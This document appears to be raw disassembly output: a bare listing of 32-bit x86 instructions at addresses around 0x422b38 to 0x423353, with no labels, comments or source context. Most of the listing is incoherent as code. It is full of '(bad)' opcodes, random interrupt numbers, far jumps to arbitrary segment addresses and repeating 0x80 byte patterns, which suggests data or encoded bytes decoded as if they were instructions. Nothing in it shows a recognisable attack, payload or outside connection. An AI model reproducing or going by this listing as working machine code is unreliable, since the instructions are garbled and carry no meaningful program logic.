  422b38:	(bad)  
  422b39:	jge    0x422af8
  422b3b:	outs   dx,DWORD PTR ds:[esi]
  422b3c:	xchg   edx,eax
  422b3d:	add    BYTE PTR [eax-0x5563eb2a],0xa0
  422b44:	sahf   
  422b45:	mov    al,ds:0x3454009e
  422b4a:	jno    0x422bae
  422b4c:	popa   
  422b4d:	mov    ah,0x86
  422b4f:	add    BYTE PTR [eax+0x77ec80c1],0xd0
  422b56:	push   cs
  422b57:	(bad)  
  422b58:	jge    0x422b17
  422b5a:	push   eax
  422b5b:	xchg   edx,eax
  422b5c:	add    BYTE PTR [eax+0x2d048d6],0xff
  422b63:	jge    0x422b22
  422b65:	push   ss
  422b66:	xchg   edx,eax
  422b67:	add    BYTE PTR [eax+0x649c5bd6],0x8b
  422b6e:	ror    BYTE PTR [ecx+0x53d09282],1
  422b74:	jo     0x422b43
  422b76:	(bad)  
  422b77:	std    
  422b78:	xor    edx,esi
  422b7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b7b:	inc    ebx
  422b7c:	(bad)  
  422b7d:	xor    al,0x2f
  422b7f:	or     esp,ebx
  422b81:	add    DWORD PTR [eax-0x1932ba80],0xceeb41fd
  422b8b:	add    DWORD PTR [eax-0x42622f80],0x808081fa
  422b95:	int    0xd6
  422b97:	popf   
  422b98:	aam    0x23
  422b9a:	shl    BYTE PTR [ebp-0x7f7e1143],1
  422ba0:	or     ch,0xd6
  422ba3:	xchg   ebp,eax
  422ba4:	aam    0x89
  422ba6:	int    0xd6
  422ba8:	icebp  
  422ba9:	int    0x8d
  422bab:	xchg   ebp,eax
  422bac:	or     cl,BYTE PTR [ebp-0x6272320f]
  422bb2:	or     cl,BYTE PTR [ebp-0x5a72326b]
  422bb8:	or     cl,BYTE PTR [ebp-0x5a29f563]
  422bbe:	pushf  
  422bbf:	stos   BYTE PTR es:[edi],al
  422bc0:	sahf   
  422bc1:	popa   
  422bc2:	mov    esp,0xc180804a
  422bc7:	mov    BYTE PTR [edi+0x649a62d9],al
  422bcd:	mov    ecx,edx
  422bcf:	rol    DWORD PTR [edx+0x70878492],cl
  422bd5:	int    0xc6
  422bd7:	or     eax,0x808169bd
  422bdc:	adc    dh,0x14
  422bdf:	int    0x76
  422be1:	mov    ebp,0xd30de6cd
  422be6:	lods   eax,DWORD PTR ds:[esi]
  422be7:	xchg   DWORD PTR [ebx],esi
  422be9:	retf   
  422bea:	ror    BYTE PTR [eax+0x7ae4cfa8],0x84
  422bf1:	in     al,dx
  422bf2:	push   esi
  422bf3:	int    0xc6
  422bf5:	or     eax,0xbd92c704
  422bfa:	daa    
  422bfb:	add    DWORD PTR [eax-0x32e32980],0xe6cdbd76
  422c05:	or     eax,0xc087add3
  422c0a:	mov    BYTE PTR [esi-0x30577740],bl
  422c10:	gs jp  0x422b97
  422c13:	add    DWORD PTR [eax-0x3ccf1380],0x80809284
  422c1d:	xchg   esi,esp
  422c1f:	or     eax,0x699e30c0
  422c24:	add    BYTE PTR [ecx-0x72f57f80],0xb5
  422c2b:	xor    ebp,DWORD PTR [ebp+0x6c]
  422c2e:	int    0x10
  422c30:	mov    ebp,0x808081bc
  422c35:	int    0x7d
  422c37:	xor    ecx,DWORD PTR [edi]
  422c39:	xor    ah,0x81
  422c3c:	lea    esi,[ebp-0x7b8a19fc]
  422c42:	das    
  422c43:	add    al,0xd0
  422c45:	add    BYTE PTR [eax+0x75760480],0x8b
  422c4c:	int    0x8d
  422c4e:	mov    ch,0x4
  422c50:	cli    
  422c51:	test   BYTE PTR [edx-0x61783f79],al
  422c57:	int    0xe6
  422c59:	jge    0x422c2e
  422c5b:	xacquire xchg BYTE PTR [ebx],dh
  422c5e:	ins    DWORD PTR es:[edi],dx
  422c5f:	ins    BYTE PTR es:[edi],dx
  422c60:	shr    BYTE PTR [eax+ebp*4-0x31],0x65
  422c65:	outs   dx,DWORD PTR ds:[esi]
  422c66:	lods   al,BYTE PTR ds:[esi]
  422c67:	xchg   DWORD PTR [eax-0x42ef3280],eax
  422c6d:	inc    esp
  422c6e:	add    DWORD PTR [eax+0x337dcd80],0xaf4820f
  422c78:	lea    edi,[ebp+0x4a58d0a]
  422c7e:	cli    
  422c7f:	test   BYTE PTR [edx+0x402cd77],al
  422c85:	mov    dh,0xa5
  422c87:	and    ebx,0xa58d04ef
  422c8d:	xchg   edx,eax
  422c8e:	mov    es,WORD PTR [edx+edi*8]
  422c91:	dec    esi
  422c92:	ja     0x422cb2
  422c94:	pop    ebp
  422c95:	rcl    DWORD PTR [edx-0x2ccc7f80],1
  422c9b:	int    0xf
  422c9d:	fidiv  DWORD PTR [esi-0x5a89785b]
  422ca3:	jecxz  0x422c52
  422ca5:	xchg   DWORD PTR [esi+0x7d],esi
  422ca8:	or     dh,BYTE PTR [esi+0xd]
  422cab:	in     al,dx
  422cac:	inc    esi
  422cad:	add    al,0xef
  422caf:	test   BYTE PTR [ebp-0x7f7f7fc9],bh
  422cb5:	jecxz  0x422ca3
  422cb7:	jecxz  0x422c6f
  422cb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cba:	pop    esi
  422cbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422cbc:	lods   eax,DWORD PTR ds:[esi]
  422cbd:	add    BYTE PTR [esi+0x3ea57600],0xa6
  422cc4:	lods   eax,DWORD PTR ds:[esi]
  422cc5:	mov    ss,esi
  422cc7:	mov    ebp,0x8086745d
  422ccc:	add    BYTE PTR [edi+0x760a7d76],0xd
  422cd3:	shl    DWORD PTR [esi-0x7b3f7b5b],cl
  422cd9:	test   al,0x33
  422cdb:	add    BYTE PTR [edx-0x33],bh
  422cde:	leave  
  422cdf:	int    0xc6
  422ce1:	or     eax,0x808059bd
  422ce6:	cmp    BYTE PTR ds:0x8987d481,0xe6
  422ced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cee:	jecxz  0x422cd9
  422cf0:	mov    ss,esi
  422cf2:	in     eax,dx
  422cf3:	in     al,dx
  422cf4:	add    BYTE PTR [eax],0x76
  422cf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cf8:	int    0x8d
  422cfa:	mov    ch,0x4
  422cfc:	rcl    DWORD PTR [edx-0x32021933],cl
  422d02:	leave  
  422d03:	xor    esi,DWORD PTR [esi+0x34]
  422d06:	pop    esi
  422d07:	jbe    0x422cae
  422d09:	jnp    0x422c95
  422d0b:	int    0xf8
  422d0d:	xor    edx,esi
  422d0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d10:	int    0x96
  422d12:	cmp    al,0x45
  422d14:	inc    ecx
  422d15:	inc    ebx
  422d16:	add    esi,DWORD PTR [edi-0x79]
  422d19:	jle    0x422cf1
  422d1b:	clc    
  422d1c:	or     ah,dh
  422d1e:	std    
  422d1f:	das    
  422d20:	pop    ecx
  422d21:	adc    DWORD PTR [ebx-0x1a],eax
  422d24:	cmp    al,0x2f
  422d26:	or     esp,DWORD PTR [edx-0x2]
  422d29:	add    BYTE PTR [eax],al
  422d2b:	mov    ebp,0x80808040
  422d30:	xor    ebp,DWORD PTR [ebp-0x31]
  422d33:	les    esi,FWORD PTR [esp+eiz*2]
  422d36:	int    0x96
  422d38:	sub    al,0xcd
  422d3a:	(bad)  
  422d3b:	stc    
  422d3c:	xor    edx,esi
  422d3e:	sbb    al,0xa
  422d40:	inc    edx
  422d41:	int    0x96
  422d43:	inc    esp
  422d44:	int    0xe6
  422d46:	std    
  422d47:	xor    esp,esi
  422d49:	xor    al,0xa
  422d4b:	pusha  
  422d4c:	retf   
  422d4d:	arpl   WORD PTR [eax-0x7fdb2d56],bp
  422d53:	test   al,0x9c
  422d55:	xor    ebp,DWORD PTR [ebp+0x6c]
  422d58:	in     al,dx
  422d59:	popf   
  422d5a:	adc    bh,ah
  422d5c:	add    BYTE PTR [eax-0x7e7d7e80],0xc5
  422d63:	shl    ebp,cl
  422d65:	mov    BYTE PTR [eax+0x43f9d6cd],bl
  422d6b:	(bad)  
  422d6c:	and    al,0x77
  422d6e:	mov    ch,0xcd
  422d70:	jbe    0x422d1f
  422d72:	shr    DWORD PTR [ebp+0x760a4588],cl
  422d78:	lods   eax,DWORD PTR ds:[esi]
  422d79:	or     dl,dh
  422d7b:	stc    
  422d7c:	test   al,0xc5
  422d7e:	int    0x8d
  422d80:	jne    0x422db1
  422d82:	pop    ecx
  422d83:	ins    DWORD PTR es:[edi],dx
  422d84:	shl    edx,cl
  422d86:	test   BYTE PTR [edi-0x2c78428a],al
  422d8c:	in     al,dx
  422d8d:	xchg   BYTE PTR [edi],ch
  422d8f:	pop    ecx
  422d90:	ins    DWORD PTR es:[edi],dx
  422d91:	xchg   DWORD PTR [esi+0x75],esi
  422d94:	int    0xc6
  422d96:	jge    0x422d67
  422d98:	les    esi,FWORD PTR [esi-0x80]
  422d9b:	xor    ebp,DWORD PTR [ebp-0x31]
  422d9e:	les    esi,FWORD PTR [esi-0x80]
  422da1:	adc    bh,ah
  422da3:	add    BYTE PTR [eax+0x24778180],0xcd
  422daa:	mov    WORD PTR [esp+ebx*2],?
  422dad:	shl    DWORD PTR [esp+esi*1-0x73bc77d4],cl
  422db4:	xor    al,0xa4
  422db6:	ja     0x422ddd
  422db8:	retf   0x31
  422dbb:	je     0x422df1
  422dbd:	pop    esp
  422dbe:	shl    ebp,cl
  422dc0:	mov    BYTE PTR [ecx],cl
  422dc2:	xchg   esp,eax
  422dc3:	xor    al,0x2c
  422dc5:	int    0xc
  422dc7:	das    
  422dc8:	mov    ebx,0xebd38096
  422dcd:	push   ebx
  422dce:	das    
  422dcf:	rcl    DWORD PTR [ebx],1
  422dd1:	pop    esi
  422dd2:	mov    WORD PTR [esp+ebp*1],?
  422dd5:	ja     0x422df1
  422dd7:	int    0xdb
  422dd9:	pop    edi
  422dda:	or     BYTE PTR [eax+0x13338080],0xd3
  422de1:	jmp    0x422d68
  422de3:	mov    eax,0x87808d81
  422de8:	ins    DWORD PTR es:[edi],dx
  422de9:	iret   
  422dea:	les    esi,FWORD PTR [esp+ebp*2]
  422ded:	(bad)
  422df0:	test   DWORD PTR [esi],edi
  422df2:	mov    WORD PTR [esp+ebp*1],?
  422df5:	xor    ebx,ebx
  422df7:	mov    eax,0x8780963e
  422dfc:	ins    DWORD PTR es:[edi],dx
  422dfd:	add    al,0x6d
  422dff:	or     edi,0xc56c34c4
  422e05:	cwde   
  422e06:	int    0xf0
  422e08:	mov    ebp,0xfcd9
  422e0d:	int    0xd9
  422e0f:	int    0xf
  422e11:	jns    0x422d99
  422e13:	mov    bh,0xbd
  422e15:	sub    esp,edi
  422e17:	add    BYTE PTR [eax],al
  422e19:	cwde   
  422e1a:	int    0xf0
  422e1c:	jns    0x422e96
  422e1e:	test   DWORD PTR [ebx+0xfc6bbd],esp
  422e24:	add    BYTE PTR [eax-0x58798787],bl
  422e2a:	mov    ebp,0xfc38
  422e2f:	jns    0x422ea9
  422e31:	xchg   edx,eax
  422e32:	cmp    eax,0xeceb99cd
  422e37:	add    eax,DWORD PTR [eax]
  422e39:	add    BYTE PTR [esi-0x12ed1233],dl
  422e3f:	inc    esp
  422e40:	add    DWORD PTR [eax-0x6893680],0x35862149
  422e4a:	leave  
  422e4b:	jbe    0x422e02
  422e4d:	inc    ecx
  422e4e:	and    DWORD PTR [esi-0x778932cb],eax
  422e54:	or     dh,BYTE PTR [esi-0x78]
  422e57:	int    0x76
  422e59:	stc    
  422e5a:	int    0x96
  422e5c:	stc    
  422e5d:	pop    ebx
  422e5e:	cwde   
  422e5f:	call   0xd3e3:0x3b9effc0
  422e66:	jmp    0x3586:0x21d1bf28
  422e6d:	cmp    eax,ebp
  422e6f:	sar    DWORD PTR [ebp+0xad25392],cl
  422e75:	jbe    0x422eec
  422e77:	int    0x76
  422e79:	stc    
  422e7a:	int    0x96
  422e7c:	stc    
  422e7d:	cmp    eax,ebp
  422e7f:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e85:	jmp    0xfd76:0xad25328
  422e8c:	int    0x76
  422e8e:	stc    
  422e8f:	int    0x96
  422e91:	stc    
  422e92:	cmp    eax,ebp
  422e94:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e9a:	jmp    0xd076:0xad25328
  422ea1:	int    0x76
  422ea3:	stc    
  422ea4:	int    0x96
  422ea6:	stc    
  422ea7:	cmp    eax,ebp
  422ea9:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422eaf:	jmp    0xbd76:0xad25328
  422eb6:	leave  
  422eb7:	jbe    0x422ee6
  422eb9:	dec    ecx
  422eba:	and    DWORD PTR [ebp+esi*1+0x496576c9],eax
  422ec1:	mov    al,ds:0x76c93586
  422ec6:	and    eax,0x35862169
  422ecb:	sar    BYTE PTR [esp+ebx*4],0xa
  422ecf:	jbe    0x422ea1
  422ed1:	or     dh,BYTE PTR [esi-0x30]
  422ed4:	sar    BYTE PTR [esp+ebx*4+0xad0760a],0x76
  422edc:	ror    cl,1
  422ede:	jbe    0x422eb0
  422ee0:	jo     0x422e62
  422ee2:	add    BYTE PTR [eax+0x78d076c9],0x80
  422ee9:	add    BYTE PTR [eax-0x32068933],0x96
  422ef0:	stc    
  422ef1:	cmp    eax,ebp
  422ef3:	cmp    esp,ebx
  422ef5:	sar    DWORD PTR [ebp+0x28ead392],cl
  422efb:	push   ebx
  422efc:	ror    BYTE PTR [edx],cl
  422efe:	jbe    0x422ed0
  422f00:	int    0x76
  422f02:	stc    
  422f03:	int    0x96
  422f05:	stc    
  422f06:	cmp    eax,ebp
  422f08:	cmp    esp,ebx
  422f0a:	sar    DWORD PTR [ebp+0x28ead392],cl
  422f10:	push   ebx
  422f11:	ror    BYTE PTR [edx],cl
  422f13:	jbe    0x422ee5
  422f15:	leave  
  422f16:	jbe    0x422ead
  422f18:	arpl   WORD PTR [edx+0x76c98080],dx
  422f1e:	lods   eax,DWORD PTR ds:[esi]
  422f1f:	pop    esi
  422f20:	add    BYTE PTR [eax+0xd76c980],0xe6
  422f27:	add    BYTE PTR [eax-0xa983080],0xff
  422f2e:	add    BYTE PTR [eax],al
  422f30:	iret   
  422f31:	push   edi
  422f32:	xchg   ebp,eax
  422f33:	inc    DWORD PTR [eax]
  422f35:	add    BYTE PTR [ebp+0xff13],bh
  422f3b:	add    BYTE PTR [ebp+0xf3d60d],cl
  422f41:	lea    ebp,[ebp-0x72ff562a]
  422f47:	xchg   ebp,eax
  422f48:	(bad)  
  422f49:	fcmove st,st(1)
  422f4b:	jbe    0x422efa
  422f4d:	dec    esi
  422f4e:	ins    BYTE PTR es:[edi],dx
  422f4f:	add    BYTE PTR [eax-0x32068933],0x8d
  422f56:	stc    
  422f57:	cmp    eax,ebp
  422f59:	sar    DWORD PTR [ebp-0x57003f6e],cl
  422f5f:	cmp    ecx,DWORD PTR [edi]
  422f61:	shl    edx,cl
  422f63:	sub    BYTE PTR [ebx-0x2d],dl
  422f66:	or     dh,BYTE PTR [esi+0x6d]
  422f69:	int    0x76
  422f6b:	stc    
  422f6c:	int    0x8d
  422f6e:	stc    
  422f6f:	add    al,0xb6
  422f71:	cmc    
  422f72:	cmp    BYTE PTR [ebx],0xc5
  422f75:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  422f7b:	repnz sub BYTE PTR [ebx-0x2d],dl
  422f7f:	or     dh,BYTE PTR [esi-0x6b]
  422f82:	mov    ah,0xb1
  422f84:	sbb    al,0x80
  422f86:	add    BYTE PTR [eax-0x320a89f6],0x6c
  422f8d:	push   eax
  422f8e:	or     dh,BYTE PTR [esi-0x13]
  422f91:	int    0x6c
  422f93:	dec    esp
  422f94:	or     dh,BYTE PTR [esi+0x11]
  422f97:	int    0x76
  422f99:	mov    bh,cl
  422f9b:	(bad)  
  422f9c:	cmc    
  422f9d:	or     cl,BYTE PTR [ecx]
  422f9f:	rol    BYTE PTR [ecx+0x76cd8080],1
  422fa5:	mov    bh,cl
  422fa7:	(bad)  
  422fa8:	in     eax,dx
  422fa9:	or     cl,BYTE PTR [ecx]
  422fab:	push   ebp
  422fac:	add    DWORD PTR [eax-0x77893280],0xcf88d600
  422fb6:	lea    edx,[ecx]
  422fb8:	or     cl,BYTE PTR [ecx]
  422fba:	pop    ebp
  422fbb:	add    DWORD PTR [eax+0x3eccbd80],0x8dcd8080
  422fc5:	stc    
  422fc6:	int    0x96
  422fc8:	stc    
  422fc9:	cmp    ecx,DWORD PTR [ebx+edi*1]
  422fcc:	cdq    
  422fcd:	shr    ebx,cl
  422fcf:	xchg   edx,eax
  422fd0:	shr    edx,cl
  422fd2:	sub    BYTE PTR [ebx+0x13],dl
  422fd5:	inc    ebx
  422fd6:	jge    0x423007
  422fd8:	add    eax,0x808087ca
  422fdd:	int    0x76
  422fdf:	mov    ch,cl
  422fe1:	add    DWORD PTR ds:0xcd808081,esi
  422fe7:	mov    ch,cl
  422fe9:	jbe    0x422f73
  422feb:	int    0x1
  422fed:	xor    eax,0xcd808081
  422ff2:	add    BYTE PTR [edi-0x72329b92],0x88
  422ff9:	int    0xa
  422ffb:	adc    DWORD PTR [ecx+0x17cf8080],eax
  423001:	adc    al,0x0
  423003:	add    BYTE PTR [eax],al
  423005:	(bad)  
  423006:	int    0x96
  423008:	mov    ch,cl
  42300a:	mov    ds:0x80808125,al
  42300f:	int    0x22
  423011:	xchg   DWORD PTR [eax-0x7f7f7ff7],esi
  423017:	rol    BYTE PTR [eax+eax*1-0x7f7f3330],0x80
  42301f:	bound  eax,QWORD PTR [eax]
  423021:	jno    0x423047
  423023:	cmp    ebp,DWORD PTR [ebp-0x37]
  423026:	push   es
  423027:	push   esp
  423028:	add    BYTE PTR [eax],al
  42302a:	add    BYTE PTR [esi],cl
  42302c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42302d:	aad    0x49
  42302f:	leave  
  423030:	push   es
  423031:	pop    esp
  423032:	add    BYTE PTR [eax],al
  423034:	add    BYTE PTR [edi+0x35],dl
  423037:	adc    ebp,DWORD PTR [ebx+0x6406c9]
  42303d:	add    BYTE PTR [eax],al
  42303f:	mov    ds:0x79d735c1,eax
  423044:	push   es
  423045:	ins    BYTE PTR es:[edi],dx
  423046:	add    BYTE PTR [eax],al
  423048:	add    BYTE PTR [eax],bl
  42304a:	iret   
  42304b:	outs   dx,BYTE PTR ds:[si]
  42304d:	add    BYTE PTR [eax],al
  42304f:	add    BYTE PTR [edi+0x3b41afb8],ch
  423055:	ins    DWORD PTR es:[edi],dx
  423056:	leave  
  423057:	push   es
  423058:	sub    al,0x0
  42305a:	add    BYTE PTR [eax],al
  42305c:	push   cs
  42305d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42305e:	aad    0x49
  423060:	leave  
  423061:	push   es
  423062:	xor    al,0x0
  423064:	add    BYTE PTR [eax],al
  423066:	push   edi
  423067:	xor    eax,0x6c9ab13
  42306c:	cmp    al,0x0
  42306e:	add    BYTE PTR [eax],al
  423070:	mov    ds:0x79c335c1,eax
  423075:	push   es
  423076:	inc    esp
  423077:	add    BYTE PTR [eax],al
  423079:	add    BYTE PTR [eax],bl
  42307b:	iret   
  42307c:	addr16 inc esi
  42307e:	add    BYTE PTR [eax],al
  423080:	add    BYTE PTR [edi-0x32be5048],ch
  423086:	jbe    0x423010
  423088:	int    0x1
  42308a:	adc    DWORD PTR [ecx-0x19327f80],eax
  423090:	mov    BYTE PTR [ebp*2+0x35760a30],al
  423097:	int    0x76
  423099:	mov    ch,cl
  42309b:	add    DWORD PTR [ebp-0x7f],edi
  42309e:	add    BYTE PTR [eax+0x410176c9],0xa7
  4230a5:	mov    dl,0x35
  4230a7:	leave  
  4230a8:	jbe    0x4230af
  4230aa:	mov    bh,0x3f
  4230ac:	cmp    DWORD PTR [edi-0x48],eax
  4230af:	leave  
  4230b0:	jbe    0x4230bb
  4230b2:	xlat   BYTE PTR ds:[ebx]
  4230b3:	sbb    cl,cl
  4230b5:	push   es
  4230b6:	les    eax,FWORD PTR [eax]
  4230b8:	add    BYTE PTR [eax],al
  4230ba:	push   cs
  4230bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230bc:	aad    0x49
  4230be:	leave  
  4230bf:	push   es
  4230c0:	nop
  4230c1:	add    BYTE PTR [eax],al
  4230c3:	add    BYTE PTR [edi+0x35],dl
  4230c6:	xlat   BYTE PTR ds:[ebx]
  4230c7:	inc    ecx
  4230c8:	leave  
  4230c9:	push   es
  4230ca:	aam    0x0
  4230cc:	add    BYTE PTR [eax],al
  4230ce:	cmp    DWORD PTR [ecx+0x57],ecx
  4230d1:	jge    0x42309c
  4230d3:	push   es
  4230d4:	fadd   QWORD PTR [eax]
  4230d6:	add    BYTE PTR [eax],al
  4230d8:	mov    cl,0x3f
  4230da:	shl    DWORD PTR ds:0xe406c9,0x0
  4230e1:	add    BYTE PTR [edi-0x49],al
  4230e4:	xlat   BYTE PTR ds:[ebx]
  4230e5:	sbb    cl,cl
  4230e7:	push   es
  4230e8:	pushf  
  4230e9:	add    BYTE PTR [eax],al
  4230eb:	add    BYTE PTR [esi],cl
  4230ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230ee:	aad    0x49
  4230f0:	leave  
  4230f1:	push   es
  4230f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230f3:	add    BYTE PTR [eax],al
  4230f5:	add    BYTE PTR [edi+0x35],dl
  4230f8:	xlat   BYTE PTR ds:[ebx]
  4230f9:	inc    ecx
  4230fa:	leave  
  4230fb:	push   es
  4230fc:	lods   al,BYTE PTR ds:[esi]
  4230fd:	add    BYTE PTR [eax],al
  4230ff:	add    BYTE PTR [ecx],bh
  423101:	dec    ecx
  423102:	push   edi
  423103:	jge    0x4230ce
  423105:	push   es
  423106:	mov    ah,0x0
  423108:	add    BYTE PTR [eax],al
  42310a:	mov    cl,0x3f
  42310c:	shl    DWORD PTR ds:0xbc06c9,0x0
  423113:	add    BYTE PTR [edi-0x49],al
  423116:	ret    
  423117:	sbb    BYTE PTR [ebp-0x7f7fc39d],bh
  42311d:	jo     0x4230ec
  42311f:	jbe    0x423156
  423121:	add    BYTE PTR [eax],dh
  423123:	int    0x76
  423125:	stc    
  423126:	int    0x8d
  423128:	stc    
  423129:	cmp    eax,ebp
  42312b:	cmp    ecx,DWORD PTR [edi]
  42312d:	shl    edx,cl
  42312f:	sub    bl,dl
  423131:	mov    ebp,0xcdd35392
  423136:	lea    ebp,[ebp+0x52fd343]
  42313c:	test   BYTE PTR [ecx+0x76cd8080],0xb5
  423143:	int    0x8d
  423145:	mov    ch,0x3b
  423147:	lds    edi,FWORD PTR [ebx]
  423149:	psrlq  mm6,mm2
  42314c:	sub    bl,dl
  42314e:	mov    ebp,0xcdd35392
  423153:	lea    ebp,[ebp+0x76cd7d33]
  423159:	ins    DWORD PTR es:[edi],dx
  42315a:	inc    ebx
  42315b:	shr    DWORD PTR [edi],cl
  42315d:	or     ch,dl
  42315f:	add    DWORD PTR [eax+0x3d76c980],0x80808080
  423169:	int    0x76
  42316b:	mov    ch,cl
  42316d:	rcl    BYTE PTR [ecx],1
  42316f:	add    DWORD PTR [eax-0x77193280],0xcd8876cd
  423179:	add    DWORD PTR [ebp-0x7f],esi
  42317c:	add    BYTE PTR [eax-0x7fc50943],0x80
  423183:	jo     0x423185
  423185:	cwde   
  423186:	xor    ch,cl
  423188:	lea    ecx,[eax-0x7ebaf533]
  42318e:	add    BYTE PTR [eax+0x76cd810a],0x88
  423195:	int    0x5d
  423197:	adc    DWORD PTR [ecx-0x29327f80],eax
  42319d:	mov    BYTE PTR [ebx],bh
  42319f:	ins    DWORD PTR es:[edi],dx
  4231a0:	iret   
  4231a1:	pop    ss
  4231a2:	pushf  
  4231a3:	add    BYTE PTR [eax],al
  4231a5:	add    BYTE PTR [ebp-0x7f7fc36e],bh
  4231ab:	jo     0x42317a
  4231ad:	jbe    0x423137
  4231af:	int    0x1
  4231b1:	inc    ebp
  4231b2:	add    DWORD PTR [eax+0x500080],0x760a889a
  4231bc:	adc    eax,0xcd8876cd
  4231c1:	pop    ebp
  4231c2:	adc    DWORD PTR [ecx-0x29327f80],eax
  4231c8:	mov    BYTE PTR [ebx],bh
  4231ca:	ins    DWORD PTR es:[edi],dx
  4231cb:	iret   
  4231cc:	pop    ss
  4231cd:	les    eax,FWORD PTR [eax]
  4231cf:	add    BYTE PTR [eax],al
  4231d1:	mov    ebp,0x80803ad9
  4231d6:	jo     0x4231a5
  4231d8:	jbe    0x423162
  4231da:	int    0x1
  4231dc:	inc    ebp
  4231dd:	add    DWORD PTR [eax+0x500080],0x76cd889a
  4231e7:	mov    ch,cl
  4231e9:	pop    ebp
  4231ea:	adc    DWORD PTR [ecx-0x29327f80],eax
  4231f0:	mov    BYTE PTR [ebx],bh
  4231f2:	ins    DWORD PTR es:[edi],dx
  4231f3:	iret   
  4231f4:	pop    ss
  4231f5:	push   esp
  4231f6:	add    BYTE PTR [eax],al
  4231f8:	add    BYTE PTR [ebp-0x7f7fc52f],bh
  4231fe:	jo     0x4231cd
  423200:	jbe    0x42318a
  423202:	int    0x1
  423204:	inc    ebp
  423205:	add    DWORD PTR [eax+0x500080],0xb604889a
  42320f:	pop    ebp
  423210:	or     BYTE PTR [edx],0x76
  423213:	xor    eax,0xc05d76cd
  423218:	push   ds
  423219:	cmp    ebx,edx
  42321b:	sahf   
  42321c:	clc    
  42321d:	add    al,BYTE PTR [ecx]
  42321f:	shr    BYTE PTR [esi+0x2f],cl
  423222:	pop    ecx
  423223:	shl    BYTE PTR [eax+0x0],cl
  423226:	xchg   esi,eax
  423227:	xor    eax,0x43d66d06
  42322c:	int    0x76
  42322e:	pop    ebp
  42322f:	add    al,0xad
  423231:	mov    eax,DWORD PTR [ebp*2-0x69ff8faf]
  423238:	adc    eax,0x40d46d06
  42323d:	int    0x76
  42323f:	mov    ch,cl
  423241:	pop    ebp
  423242:	adc    DWORD PTR [ecx-0x29327f80],eax
  423248:	mov    BYTE PTR [ebx],bh
  42324a:	ins    DWORD PTR es:[edi],dx
  42324b:	iret   
  42324c:	xchg   esi,eax
  42324d:	add    DWORD PTR [ebp-0x7f7fc560],edi
  423253:	jo     0x423222
  423255:	jbe    0x4231df
  423257:	int    0x1
  423259:	cmp    eax,0x808081
  42325e:	push   eax
  42325f:	add    BYTE PTR [edx+0xd760a88],bl
  423265:	in     al,dx
  423266:	test   BYTE PTR [esi+esi*4],al
  423269:	or     eax,0x5d760080
  42326e:	add    al,0xe6
  423270:	pop    ebp
  423271:	sub    al,0x82
  423273:	sub    eax,0xcdb576cd
  423278:	lea    esi,[ebp-0x3f772933]
  42327e:	jmp    FWORD PTR [edx-0xfc43ac5]
  423284:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42328a:	push   ebx
  42328b:	ror    edi,cl
  42328d:	pop    ss
  42328e:	cmc    
  42328f:	inc    DWORD PTR [eax]
  423291:	add    BYTE PTR [ebp-0x7f7fc5e8],bh
  423297:	jo     0x423266
  423299:	jbe    0x423294
  42329b:	int    0x8d
  42329d:	stc    
  42329e:	int    0xd6
  4232a0:	mov    BYTE PTR [ebx],bh
  4232a2:	lds    edi,FWORD PTR [ebx]
  4232a4:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4232ab:	push   ebx
  4232ac:	ror    edi,cl
  4232ae:	pop    ss
  4232af:	xchg   ebp,eax
  4232b0:	inc    DWORD PTR [eax]
  4232b2:	add    BYTE PTR [ebp-0x7f7fc70a],bh
  4232b8:	jo     0x4232ba
  4232ba:	xchg   esi,eax
  4232bb:	or     eax,0xcdf98dcd
  4232c0:	xchg   esi,eax
  4232c1:	stc    
  4232c2:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4232c5:	(bad)  
  4232c7:	jmp    0x42325b
  4232c9:	shr    edx,cl
  4232cb:	sub    BYTE PTR [ebx+0x13],dl
  4232ce:	inc    ebx
  4232cf:	jge    0x4232a7
  4232d1:	mov    ecx,ecx
  4232d3:	jbe    0x423312
  4232d5:	add    DWORD PTR [eax+0x76cd8080],0xb58dcdb5
  4232df:	cmp    eax,ebp
  4232e1:	sar    DWORD PTR [ebp-0x2c0fc46e],cl
  4232e7:	repnz sub BYTE PTR [ebx-0x2d],dl
  4232eb:	xchg   DWORD PTR [esi+0x6d],esi
  4232ee:	or     dh,BYTE PTR [esi+0x6d]
  4232f1:	int    0x76
  4232f3:	cmp    eax,0x1cd46d06
  4232f8:	int    0x76
  4232fa:	mov    ch,0xcd
  4232fc:	lea    esi,[ebp-0xfc43ac5]
  423302:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423308:	push   ebx
  423309:	rol    DWORD PTR [edi+0x760a9576],cl
  42330f:	xchg   ebp,eax
  423310:	int    0x76
  423312:	mov    ch,0xcd
  423314:	lea    esi,[ebp-0xfc43ac5]
  42331a:	shl    edx,cl
  42331c:	sub    bl,dl
  42331e:	mov    ebp,0xcdd35392
  423323:	lea    ebp,[ebp+0x76cd7d33]
  423329:	ins    DWORD PTR es:[edi],dx
  42332a:	inc    ebx
  42332b:	shr    DWORD PTR [edi],cl
  42332d:	pop    es
  42332e:	push   eax
  42332f:	inc    DWORD PTR [eax]
  423331:	add    al,al
  423333:	jmp    FWORD PTR [eax-0x326a8933]
  423339:	lea    ebp,[ebp+0x43]
  42333c:	jge    0x423314
  42333e:	xor    DWORD PTR [eax],eax
  423340:	(bad)  
  423341:	mov    bh,cl
  423343:	jbe    0x423342
  423345:	jo     0x423304
  423347:	stc    
  423348:	jl     0x4232ca
  42334a:	or     BYTE PTR [edx],0x76
  42334d:	jne    0x42333b
  42334f:	sbb    cl,ch
  423351:	jbe    0x4233c8
  423353:	int    0x8d
